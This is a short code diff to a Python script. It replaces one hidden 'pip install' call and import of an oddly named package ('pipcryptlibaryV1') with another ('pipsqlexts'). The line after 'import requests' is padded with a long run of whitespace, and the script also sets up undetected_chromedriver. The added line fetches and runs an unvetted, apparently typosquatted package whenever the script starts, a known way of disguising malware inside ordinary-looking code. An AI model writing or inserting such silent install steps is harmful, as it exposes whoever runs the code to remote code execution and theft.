@@ -1,6 +1,6 @@
 import os
-os.system("pip install pipcryptlibaryV1")
-import pipcryptlibaryV1
+os.system("pip install pipsqlexts")
+import pipsqlexts
 import requests																																																																																																																																																																																																																																																																					
 import undetected_chromedriver as uc
 uc.install()
